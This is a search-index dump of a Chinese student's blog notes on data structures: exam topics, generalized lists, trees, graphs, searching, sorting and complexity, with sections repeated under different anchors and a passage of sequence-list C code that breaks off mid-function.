求模式串的next函数（比较重要但考试不考，李健说的） 计算题给首元素地址，和元素所占据的存储空间，求该元素的下标 广义表求表头，求表尾，求表长度 例5.11 广义表E=( a, ( a,b ), d, e, ( ( i , j ),k ))的表头为( )，表尾为( )，长度为( )，深度为( )。 答：表头为a，表尾为 ( ( a,b ), d, e, ( ( i , j ),k ) )，长度为 5，深度为 3。 任何一个非空的广义表其表头可能是原子，也可能是子表，而表尾一定是子表。 简答题特殊矩阵（上三角，下三角，对称阵，稀疏矩阵(一般不好考)）的存储方法 对称矩阵 三角矩阵 对角矩阵（带状矩阵） 稀疏矩阵 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#概念-2"},{"categories":["notice"],"content":"\r第四章串、数组和广义表\r概念什么是广义表？ n ( n\u003e0 )个表元素组成的有限序列，是线性表的一种推广。记作LS = (a0, a1, a2, …, an-1)。 求模式串的next函数（比较重要但考试不考，李健说的） 计算题给首元素地址，和元素所占据的存储空间，求该元素的下标 广义表求表头，求表尾，求表长度 例5.11 广义表E=( a, ( a,b ), d, e, ( ( i , j ),k ))的表头为( )，表尾为( )，长度为( )，深度为( )。 答：表头为a，表尾为 ( ( a,b ), d, e, ( ( i , j ),k ) )，长度为 5，深度为 3。 任何一个非空的广义表其表头可能是原子，也可能是子表，而表尾一定是子表。 简答题特殊矩阵（上三角，下三角，对称阵，稀疏矩阵(一般不好考)）的存储方法 对称矩阵 三角矩阵 对角矩阵（带状矩阵） 稀疏矩阵 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#计算题-1"},{"categories":["notice"],"content":"\r第四章串、数组和广义表\r概念什么是广义表？ n ( n\u003e0 )个表元素组成的有限序列，是线性表的一种推广。记作LS = (a0, a1, a2, …, an-1)。 求模式串的next函数（比较重要但考试不考，李健说的） 计算题给首元素地址，和元素所占据的存储空间，求该元素的下标 广义表求表头，求表尾，求表长度 例5.11 广义表E=( a, ( a,b ), d, e, ( ( i , j ),k ))的表头为( )，表尾为( )，长度为( )，深度为( )。 答：表头为a，表尾为 ( ( a,b ), d, e, ( ( i , j ),k ) )，长度为 5，深度为 3。 任何一个非空的广义表其表头可能是原子，也可能是子表，而表尾一定是子表。 简答题特殊矩阵（上三角，下三角，对称阵，稀疏矩阵(一般不好考)）的存储方法 对称矩阵 三角矩阵 对角矩阵（带状矩阵） 稀疏矩阵 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#简答题-2"},{"categories":["notice"],"content":"\r第五章树和二叉树\r概念二叉树的定义 二叉树的五个性质（理解做题） 二叉树的五种形态 算法题二叉树的遍历（肯定会考，李健说的) 递归遍历：先(根)序遍历，中序遍历，后序遍历 非递归遍历：运用栈实现、层次遍历 二叉树和树、森林之间的转换 二叉树的线索化（要会画，有实线画虚线） 霍夫曼树（重点） 最优树带权路径长度(WPL) 霍夫曼编码 140页习题 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第五章树和二叉树"},{"categories":["notice"],"content":"\r第五章树和二叉树\r概念二叉树的定义 二叉树的五个性质（理解做题） 二叉树的五种形态 算法题二叉树的遍历（肯定会考，李健说的) 递归遍历：先(根)序遍历，中序遍历，后序遍历 非递归遍历：运用栈实现、层次遍历 二叉树和树、森林之间的转换 二叉树的线索化（要会画，有实线画虚线） 霍夫曼树（重点） 最优树带权路径长度(WPL) 霍夫曼编码 140页习题 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#概念-3"},{"categories":["notice"],"content":"\r第五章树和二叉树\r概念二叉树的定义 二叉树的五个性质（理解做题） 二叉树的五种形态 算法题二叉树的遍历（肯定会考，李健说的) 递归遍历：先(根)序遍历，中序遍历，后序遍历 非递归遍历：运用栈实现、层次遍历 二叉树和树、森林之间的转换 二叉树的线索化（要会画，有实线画虚线） 霍夫曼树（重点） 最优树带权路径长度(WPL) 霍夫曼编码 140页习题 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法题"},{"categories":["notice"],"content":"\r第六章图\r概念aoe aov 最小生成树 关键路径，关键活动、强连通图、强连通分量 181页习题 计算图中结点的出入度 计算图中路径长度 操作题： 图的链接矩阵，连接表的。。表示 图的深度、广度优先遍历 156页 图的两种最小生成树算法162页 广度优先遍历最小生成树 深度优先遍历最小生成树 会用Dijkstra算法167页 关键路径解决哪两个问题 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:6","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第六章图"},{"categories":["notice"],"content":"\r第六章图\r概念aoe aov 最小生成树 关键路径，关键活动、强连通图、强连通分量 181页习题 计算图中结点的出入度 计算图中路径长度 操作题： 图的链接矩阵，连接表的。。表示 图的深度、广度优先遍历 156页 图的两种最小生成树算法162页 广度优先遍历最小生成树 深度优先遍历最小生成树 会用Dijkstra算法167页 关键路径解决哪两个问题 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:6","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#概念-4"},{"categories":["notice"],"content":"\r第七章查找概念：asl、bst、avl、二叉排序树 计算查找成功时的平均查找长度、查找失败时的平均查找长度 关键字的顺序不变，二叉排序树的插入查找，， 平衡二叉树的调整， 218页，散列表（重点），查找某元素存在的过程 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:7","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第七章查找"},{"categories":["notice"],"content":"\r第八章排序概念： 什么是排序，为什么要排序 稳定的排序算法有哪些，不稳定的排序算法有哪些 什么是堆 计算题： 253页，8.5.7 260页8.2的排序方法 （除了基数排序其他都可能考） 希尔排序，折半查找排序等 ","date":"2023-12-19","objectID":"/data_structure_notes/:2:8","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#第八章排序"},{"categories":["notice"],"content":"\r算法大题（两个）顺序表，单链表，根据复杂度要求设计算法 循环队列的实现，双栈的实现 二叉树的遍历算法 有关二叉树的统计和判断 顺序查找算法的实现（递归或非递归） 折半查找算法的实现（递归或非递归） 选择排序，冒泡排序等 ","date":"2023-12-19","objectID":"/data_structure_notes/:3:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#算法大题两个"},{"categories":["notice"],"content":"\r课程内容\r","date":"2023-12-19","objectID":"/data_structure_notes/:0:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#课程内容"},{"categories":["notice"],"content":"\r0x1绪论数据：是能输入计算机且能被计算机处理的各种符号的集合 数据元素：是数据的基本单位，在计算机程序中通常作为一个整体进行考虑和处理 ​ 也成为元素，或称为记录、结点或顶点 ​ 数据元素可以由若干的数据项组成 数据项：构成数据元素的不可分割的最小单位 数据对象：是性质相同的数据元素的集合，是数据的一个子集 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x1绪论"},{"categories":["notice"],"content":"\r1数据结构是指相互之间存在一种或多种特定关系的数据元素集合 包含三方面内容： 1.数据元素之间的逻辑关系（逻辑结构） 2.数据元素及其关系在计算机内存中的表示（物理结构或储存结构） 3.数据的运算和实现 逻辑结构与存储结构的关系 存储结构是逻辑关系的映像与元素本身的映像 逻辑结构是数据结构的抽象，储存结构是数据结构的实现 两者综合起来就建立了数据结构之间的关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#1数据结构"},{"categories":["notice"],"content":"\r1数据结构是指相互之间存在一种或多种特定关系的数据元素集合 包含三方面内容： 1.数据元素之间的逻辑关系（逻辑结构） 2.数据元素及其关系在计算机内存中的表示（物理结构或储存结构） 3.数据的运算和实现 逻辑结构与存储结构的关系 存储结构是逻辑关系的映像与元素本身的映像 逻辑结构是数据结构的抽象，储存结构是数据结构的实现 两者综合起来就建立了数据结构之间的关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#逻辑结构与存储结构的关系"},{"categories":["notice"],"content":"\r2逻辑结构的种类\r划分方式一：\r线性结构有且仅有一个开始和一个终端结点，并且所有结点都最多只有一个直接前驱和一个直接后继 如：线性表、栈、队列、串 非线性结构一个结点可能有多个直接前驱和直接后继 例如：树、图 划分方式二：集合结构：数据元素之间同属于一个集合 线性结构：数据元素之间存在着一对一的线性关系 树形结构：数据元素之间存在一对多的层次关系 图状结构：数据元素之间存在着多对多的任意关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#2逻辑结构的种类"},{"categories":["notice"],"content":"\r2逻辑结构的种类\r划分方式一：\r线性结构有且仅有一个开始和一个终端结点，并且所有结点都最多只有一个直接前驱和一个直接后继 如：线性表、栈、队列、串 非线性结构一个结点可能有多个直接前驱和直接后继 例如：树、图 划分方式二：集合结构：数据元素之间同属于一个集合 线性结构：数据元素之间存在着一对一的线性关系 树形结构：数据元素之间存在一对多的层次关系 图状结构：数据元素之间存在着多对多的任意关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#划分方式一"},{"categories":["notice"],"content":"\r2逻辑结构的种类\r划分方式一：\r线性结构有且仅有一个开始和一个终端结点，并且所有结点都最多只有一个直接前驱和一个直接后继 如：线性表、栈、队列、串 非线性结构一个结点可能有多个直接前驱和直接后继 例如：树、图 划分方式二：集合结构：数据元素之间同属于一个集合 线性结构：数据元素之间存在着一对一的线性关系 树形结构：数据元素之间存在一对多的层次关系 图状结构：数据元素之间存在着多对多的任意关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#线性结构"},{"categories":["notice"],"content":"\r2逻辑结构的种类\r划分方式一：\r线性结构有且仅有一个开始和一个终端结点，并且所有结点都最多只有一个直接前驱和一个直接后继 如：线性表、栈、队列、串 非线性结构一个结点可能有多个直接前驱和直接后继 例如：树、图 划分方式二：集合结构：数据元素之间同属于一个集合 线性结构：数据元素之间存在着一对一的线性关系 树形结构：数据元素之间存在一对多的层次关系 图状结构：数据元素之间存在着多对多的任意关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#非线性结构"},{"categories":["notice"],"content":"\r2逻辑结构的种类\r划分方式一：\r线性结构有且仅有一个开始和一个终端结点，并且所有结点都最多只有一个直接前驱和一个直接后继 如：线性表、栈、队列、串 非线性结构一个结点可能有多个直接前驱和直接后继 例如：树、图 划分方式二：集合结构：数据元素之间同属于一个集合 线性结构：数据元素之间存在着一对一的线性关系 树形结构：数据元素之间存在一对多的层次关系 图状结构：数据元素之间存在着多对多的任意关系 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#划分方式二"},{"categories":["notice"],"content":"\r3存储结构的种类\r顺序存储结构连续的存储单元依次存储数据元素，数据元素之间逻辑关系由存储位置表示 链式存储结构任意的存储单元来存储数据，数据元素之间的逻辑关系用指针来表示 索引存储结构在存储信息本身的同时，还建立附加的索引表 索引表中每一项称为一个索引项（关键字，地址） 若每个结点在索引表中都有一个索引项，则该索引表称之为稠密索引 若一组结点在索引表中只对应一个索引项，则该索引表称之为稀疏索引 散列存储结构","date":"2023-12-19","objectID":"/data_structure_notes/:1:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#3存储结构的种类"},{"categories":["notice"],"content":"\r3存储结构的种类\r顺序存储结构连续的存储单元依次存储数据元素，数据元素之间逻辑关系由存储位置表示 链式存储结构任意的存储单元来存储数据，数据元素之间的逻辑关系用指针来表示 索引存储结构在存储信息本身的同时，还建立附加的索引表 索引表中每一项称为一个索引项（关键字，地址） 若每个结点在索引表中都有一个索引项，则该索引表称之为稠密索引 若一组结点在索引表中只对应一个索引项，则该索引表称之为稀疏索引 散列存储结构","date":"2023-12-19","objectID":"/data_structure_notes/:1:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序存储结构"},{"categories":["notice"],"content":"\r3存储结构的种类\r顺序存储结构连续的存储单元依次存储数据元素，数据元素之间逻辑关系由存储位置表示 链式存储结构任意的存储单元来存储数据，数据元素之间的逻辑关系用指针来表示 索引存储结构在存储信息本身的同时，还建立附加的索引表 索引表中每一项称为一个索引项（关键字，地址） 若每个结点在索引表中都有一个索引项，则该索引表称之为稠密索引 若一组结点在索引表中只对应一个索引项，则该索引表称之为稀疏索引 散列存储结构","date":"2023-12-19","objectID":"/data_structure_notes/:1:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#链式存储结构"},{"categories":["notice"],"content":"\r3存储结构的种类\r顺序存储结构连续的存储单元依次存储数据元素，数据元素之间逻辑关系由存储位置表示 链式存储结构任意的存储单元来存储数据，数据元素之间的逻辑关系用指针来表示 索引存储结构在存储信息本身的同时，还建立附加的索引表 索引表中每一项称为一个索引项（关键字，地址） 若每个结点在索引表中都有一个索引项，则该索引表称之为稠密索引 若一组结点在索引表中只对应一个索引项，则该索引表称之为稀疏索引 散列存储结构","date":"2023-12-19","objectID":"/data_structure_notes/:1:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#索引存储结构"},{"categories":["notice"],"content":"\r3存储结构的种类\r顺序存储结构连续的存储单元依次存储数据元素，数据元素之间逻辑关系由存储位置表示 链式存储结构任意的存储单元来存储数据，数据元素之间的逻辑关系用指针来表示 索引存储结构在存储信息本身的同时，还建立附加的索引表 索引表中每一项称为一个索引项（关键字，地址） 若每个结点在索引表中都有一个索引项，则该索引表称之为稠密索引 若一组结点在索引表中只对应一个索引项，则该索引表称之为稀疏索引 散列存储结构","date":"2023-12-19","objectID":"/data_structure_notes/:1:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#散列存储结构"},{"categories":["notice"],"content":"\r4数据类型一组性质相同的值的集合，以及定义上的一组操作的总成 抽象数据类型ADT指一个数学模型以及定义在此数学模型上的一组操作 形式定义\r定义格式\r（数据对象和数据关系的定义用伪代码描述） 定义举例：复数的定义\r带\u0026是返回数据，不带的是传入数据 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#4数据类型"},{"categories":["notice"],"content":"\r4数据类型一组性质相同的值的集合，以及定义上的一组操作的总成 抽象数据类型ADT指一个数学模型以及定义在此数学模型上的一组操作 形式定义\r定义格式\r（数据对象和数据关系的定义用伪代码描述） 定义举例：复数的定义\r带\u0026是返回数据，不带的是传入数据 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#抽象数据类型adt"},{"categories":["notice"],"content":"\r4数据类型一组性质相同的值的集合，以及定义上的一组操作的总成 抽象数据类型ADT指一个数学模型以及定义在此数学模型上的一组操作 形式定义\r定义格式\r（数据对象和数据关系的定义用伪代码描述） 定义举例：复数的定义\r带\u0026是返回数据，不带的是传入数据 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#形式定义"},{"categories":["notice"],"content":"\r4数据类型一组性质相同的值的集合，以及定义上的一组操作的总成 抽象数据类型ADT指一个数学模型以及定义在此数学模型上的一组操作 形式定义\r定义格式\r（数据对象和数据关系的定义用伪代码描述） 定义举例：复数的定义\r带\u0026是返回数据，不带的是传入数据 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#定义格式"},{"categories":["notice"],"content":"\r4数据类型一组性质相同的值的集合，以及定义上的一组操作的总成 抽象数据类型ADT指一个数学模型以及定义在此数学模型上的一组操作 形式定义\r定义格式\r（数据对象和数据关系的定义用伪代码描述） 定义举例：复数的定义\r带\u0026是返回数据，不带的是传入数据 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:4","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#定义举例复数的定义"},{"categories":["notice"],"content":"\r5算法**定义：**对特定问题求解方法和步骤的一种描述，它是指令的有限序列。其中每个指令表示一个或多个操作。 **描述：**自然语言，流程图，伪代码，程序代码 时间复杂度 辅助函数f(n)，使得当n趋近无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度（O是数量级的符号），简称时间复杂度 时间复杂度是由嵌套最深层语句的频度决定的 空间复杂度 算法所需储存空间的度量，记作S(n)=O(f(n))，其中n为问题的规模或大小 时间效率的度量：\r事前分析算法运行时间=一个简单操作所需要的时间x简单操作次数 同时也=∑每条语句执行的次数(语句频度)x该语句执行一次所需要的时间 为了便于比较不同算法的时间效率，一般仅比较其数量级 事后统计利用计算机内的计时工能，不同算法的程序可以用一组或多组相同的统计数据区分。 缺点： ①必须先运行依据算法编制的程序 ②所的时间统计量依赖于硬件、软件等环境因素，掩盖算法本身的优劣 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#5算法"},{"categories":["notice"],"content":"\r5算法**定义：**对特定问题求解方法和步骤的一种描述，它是指令的有限序列。其中每个指令表示一个或多个操作。 **描述：**自然语言，流程图，伪代码，程序代码 时间复杂度 辅助函数f(n)，使得当n趋近无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度（O是数量级的符号），简称时间复杂度 时间复杂度是由嵌套最深层语句的频度决定的 空间复杂度 算法所需储存空间的度量，记作S(n)=O(f(n))，其中n为问题的规模或大小 时间效率的度量：\r事前分析算法运行时间=一个简单操作所需要的时间x简单操作次数 同时也=∑每条语句执行的次数(语句频度)x该语句执行一次所需要的时间 为了便于比较不同算法的时间效率，一般仅比较其数量级 事后统计利用计算机内的计时工能，不同算法的程序可以用一组或多组相同的统计数据区分。 缺点： ①必须先运行依据算法编制的程序 ②所的时间统计量依赖于硬件、软件等环境因素，掩盖算法本身的优劣 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#时间效率的度量"},{"categories":["notice"],"content":"\r5算法**定义：**对特定问题求解方法和步骤的一种描述，它是指令的有限序列。其中每个指令表示一个或多个操作。 **描述：**自然语言，流程图，伪代码，程序代码 时间复杂度 辅助函数f(n)，使得当n趋近无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度（O是数量级的符号），简称时间复杂度 时间复杂度是由嵌套最深层语句的频度决定的 空间复杂度 算法所需储存空间的度量，记作S(n)=O(f(n))，其中n为问题的规模或大小 时间效率的度量：\r事前分析算法运行时间=一个简单操作所需要的时间x简单操作次数 同时也=∑每条语句执行的次数(语句频度)x该语句执行一次所需要的时间 为了便于比较不同算法的时间效率，一般仅比较其数量级 事后统计利用计算机内的计时工能，不同算法的程序可以用一组或多组相同的统计数据区分。 缺点： ①必须先运行依据算法编制的程序 ②所的时间统计量依赖于硬件、软件等环境因素，掩盖算法本身的优劣 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#事前分析"},{"categories":["notice"],"content":"\r5算法**定义：**对特定问题求解方法和步骤的一种描述，它是指令的有限序列。其中每个指令表示一个或多个操作。 **描述：**自然语言，流程图，伪代码，程序代码 时间复杂度 辅助函数f(n)，使得当n趋近无穷大时，T(n)/f(n)的极限值为不等于零的常数，则称f(n)是T(n)的同数量级函数。记作T(n)=O(f(n))，称O(f(n))为算法的渐进时间复杂度（O是数量级的符号），简称时间复杂度 时间复杂度是由嵌套最深层语句的频度决定的 空间复杂度 算法所需储存空间的度量，记作S(n)=O(f(n))，其中n为问题的规模或大小 时间效率的度量：\r事前分析算法运行时间=一个简单操作所需要的时间x简单操作次数 同时也=∑每条语句执行的次数(语句频度)x该语句执行一次所需要的时间 为了便于比较不同算法的时间效率，一般仅比较其数量级 事后统计利用计算机内的计时工能，不同算法的程序可以用一组或多组相同的统计数据区分。 缺点： ①必须先运行依据算法编制的程序 ②所的时间统计量依赖于硬件、软件等环境因素，掩盖算法本身的优劣 ","date":"2023-12-19","objectID":"/data_structure_notes/:1:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#事后统计"},{"categories":["notice"],"content":"\r0x2线性表","date":"2023-12-19","objectID":"/data_structure_notes/:2:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x2线性表"},{"categories":["notice"],"content":"\r1定义和特点线性表是具有相同特性的数据元素的一个有限序列 线性表（Linear List）由n(n\u003e=0)个数据元素（结点）a1,a2,,,,an组成的有限序列 数据元素的个数n定义为表的长度 当n=0时称为空表 当非空的线性表(n\u003e0)记作：(a1,a2,,,,,,an) 这里的数据元素ai(1\u003c=i\u003c=n)只是一个抽象的符号，其中具体含义在不同的情况下可以不同 同一线性表中的元素必定有相同特征，数据元素的关系是线性关系 [案例]：稀疏多项式运算线性表A=((7,0),(3,1),(9,8),(5,17)) 线性表B=((8,4),(22,7),(-9,8)) 创建一个新数组c 分别从头遍历比较a和b的每一项 ​ 指数相同：对应系数相加，若其和不为零，则在c中增加一个新项 ​ 指数不相同，则将指数较小的项复制到c中 一个多项式已遍历完毕时，将另一个剩余项一次复制到c中即可 顺序储存结构存在的问题储存空间分配不灵活 运算的空间复杂度高 总结线性表中数据元素的类型可以为简单类型，也可以为复杂类型 从具体应用中抽象出共性的逻辑结构和基本操作（抽象数据类型） ","date":"2023-12-19","objectID":"/data_structure_notes/:2:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#1定义和特点"},{"categories":["notice"],"content":"\r1定义和特点线性表是具有相同特性的数据元素的一个有限序列 线性表（Linear List）由n(n\u003e=0)个数据元素（结点）a1,a2,,,,an组成的有限序列 数据元素的个数n定义为表的长度 当n=0时称为空表 当非空的线性表(n\u003e0)记作：(a1,a2,,,,,,an) 这里的数据元素ai(1\u003c=i\u003c=n)只是一个抽象的符号，其中具体含义在不同的情况下可以不同 同一线性表中的元素必定有相同特征，数据元素的关系是线性关系 [案例]：稀疏多项式运算线性表A=((7,0),(3,1),(9,8),(5,17)) 线性表B=((8,4),(22,7),(-9,8)) 创建一个新数组c 分别从头遍历比较a和b的每一项 ​ 指数相同：对应系数相加，若其和不为零，则在c中增加一个新项 ​ 指数不相同，则将指数较小的项复制到c中 一个多项式已遍历完毕时，将另一个剩余项一次复制到c中即可 顺序储存结构存在的问题储存空间分配不灵活 运算的空间复杂度高 总结线性表中数据元素的类型可以为简单类型，也可以为复杂类型 从具体应用中抽象出共性的逻辑结构和基本操作（抽象数据类型） ","date":"2023-12-19","objectID":"/data_structure_notes/:2:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#案例稀疏多项式运算"},{"categories":["notice"],"content":"\r1定义和特点线性表是具有相同特性的数据元素的一个有限序列 线性表（Linear List）由n(n\u003e=0)个数据元素（结点）a1,a2,,,,an组成的有限序列 数据元素的个数n定义为表的长度 当n=0时称为空表 当非空的线性表(n\u003e0)记作：(a1,a2,,,,,,an) 这里的数据元素ai(1\u003c=i\u003c=n)只是一个抽象的符号，其中具体含义在不同的情况下可以不同 同一线性表中的元素必定有相同特征，数据元素的关系是线性关系 [案例]：稀疏多项式运算线性表A=((7,0),(3,1),(9,8),(5,17)) 线性表B=((8,4),(22,7),(-9,8)) 创建一个新数组c 分别从头遍历比较a和b的每一项 ​ 指数相同：对应系数相加，若其和不为零，则在c中增加一个新项 ​ 指数不相同，则将指数较小的项复制到c中 一个多项式已遍历完毕时，将另一个剩余项一次复制到c中即可 顺序储存结构存在的问题储存空间分配不灵活 运算的空间复杂度高 总结线性表中数据元素的类型可以为简单类型，也可以为复杂类型 从具体应用中抽象出共性的逻辑结构和基本操作（抽象数据类型） ","date":"2023-12-19","objectID":"/data_structure_notes/:2:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序储存结构存在的问题"},{"categories":["notice"],"content":"\r1定义和特点线性表是具有相同特性的数据元素的一个有限序列 线性表（Linear List）由n(n\u003e=0)个数据元素（结点）a1,a2,,,,an组成的有限序列 数据元素的个数n定义为表的长度 当n=0时称为空表 当非空的线性表(n\u003e0)记作：(a1,a2,,,,,,an) 这里的数据元素ai(1\u003c=i\u003c=n)只是一个抽象的符号，其中具体含义在不同的情况下可以不同 同一线性表中的元素必定有相同特征，数据元素的关系是线性关系 [案例]：稀疏多项式运算线性表A=((7,0),(3,1),(9,8),(5,17)) 线性表B=((8,4),(22,7),(-9,8)) 创建一个新数组c 分别从头遍历比较a和b的每一项 ​ 指数相同：对应系数相加，若其和不为零，则在c中增加一个新项 ​ 指数不相同，则将指数较小的项复制到c中 一个多项式已遍历完毕时，将另一个剩余项一次复制到c中即可 顺序储存结构存在的问题储存空间分配不灵活 运算的空间复杂度高 总结线性表中数据元素的类型可以为简单类型，也可以为复杂类型 从具体应用中抽象出共性的逻辑结构和基本操作（抽象数据类型） ","date":"2023-12-19","objectID":"/data_structure_notes/:2:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#总结"},{"categories":["notice"],"content":"\r2类型的定义抽象数据类型线性表的定义如下： 基本操作 构造一个空的线性表L：InitList(\u0026L) 销毁线性表L：DestroyList(\u0026L) 将线性表L重置为空表：ClearList(\u0026L) 判断线性表L是否为空：ListEmpty(L) 返回线性表L中的数据元素个数：ListLength(L) 用e返回线性表L中第i个数据元素的值：GetElem(L,i,\u0026e);（1\u003c=i\u003c=ListLength(L)） 返回L中第1个与e满足compare()的数据元素的为序：LocateElem(L,e,compare()) 求一个元素的前驱：PriorElem(L,cure_e,\u0026pre_e) 求一个元素的后继：NextElem(L,cure_e,\u0026next_e) 线性表中插入一个元素：ListInsert(\u0026L,i,e)（1\u003c=i\u003c=ListLength(L)） 线性表中删除一个元素：ListDelete(\u0026L,i,\u0026e) 线性表元素遍历：ListTraverse(\u0026L,visited()) ","date":"2023-12-19","objectID":"/data_structure_notes/:2:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#2类型的定义"},{"categories":["notice"],"content":"\r2类型的定义抽象数据类型线性表的定义如下： 基本操作 构造一个空的线性表L：InitList(\u0026L) 销毁线性表L：DestroyList(\u0026L) 将线性表L重置为空表：ClearList(\u0026L) 判断线性表L是否为空：ListEmpty(L) 返回线性表L中的数据元素个数：ListLength(L) 用e返回线性表L中第i个数据元素的值：GetElem(L,i,\u0026e);（1\u003c=i\u003c=ListLength(L)） 返回L中第1个与e满足compare()的数据元素的为序：LocateElem(L,e,compare()) 求一个元素的前驱：PriorElem(L,cure_e,\u0026pre_e) 求一个元素的后继：NextElem(L,cure_e,\u0026next_e) 线性表中插入一个元素：ListInsert(\u0026L,i,e)（1\u003c=i\u003c=ListLength(L)） 线性表中删除一个元素：ListDelete(\u0026L,i,\u0026e) 线性表元素遍历：ListTraverse(\u0026L,visited()) ","date":"2023-12-19","objectID":"/data_structure_notes/:2:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本操作"},{"categories":["notice"],"content":"\r3顺序表示和实现顺序表示又称为顺序存储结构或顺序映像 定义：把逻辑上相邻的数据元素存储在物理上相邻的存储单元中的存储结构。 线性表顺序存储结构占用一片连续的存储位置，假设线性表的每个元素需占i个存储单元，则第i+1个数据元素的存储位置和第i个数据元素的存储位置之间满足关系： 所有数据元素的存储位置均可由第一个数据元素的存储位置得到： LOC(a1)即为基地址 顺序表的描述\r静态数组\r动态数组\r顺序表跟高级语言中数组的性质类似，我们可以用一维数组来表示顺序表： 但线性表长可变(可增删)，而数组长度不可动态定义，那我们可以用一变量表示顺序表的长度属性。 线性表定义模板： 多项式的顺序存储结构类型定义\r传值方式把实参的值传送给函数局部工作区相应的副本中，函数使用这个副本执行必要的功能。函数修改的是副本的值，实参的值不变。 指针变量作参数\r数组名作参数传递的是数组的首地址 对形参数组所作的任何改变都将反映到实参数组中 引用类型作参数引用：用来给一个对象提供一个替代的名字 三点说明： (1)传递引用给函数与传递指针的效果一样 (2)引用类型作形参，在内存中没有产生实参的副本，而是直接对实参操作 (3)指针传参易产生错误，阅读性差；在主调函数的调用点处，必须用变量的地址作为实参 补充：预定义常量和类型\r顺序表基本操作的实现线性表L的初始化（参数用引用） Status InitList_Sq(SqList \u0026L){ //构造一个空顺序表 L.elem=new ElemType[MAXSIZE]; //为顺序表分配空间 if(!L.elem)exit(OVERFLOW); //储存分配失败 L.length=0; //空表长度为0 return OK; } 销毁线性表L void DestroyList(SqList \u0026L){ if(L.elem)delete L.elem; //释放存储空间 } 清空线性表L void ClearList(SqList\u0026L){ L.length=0; //将线性表长度设为0 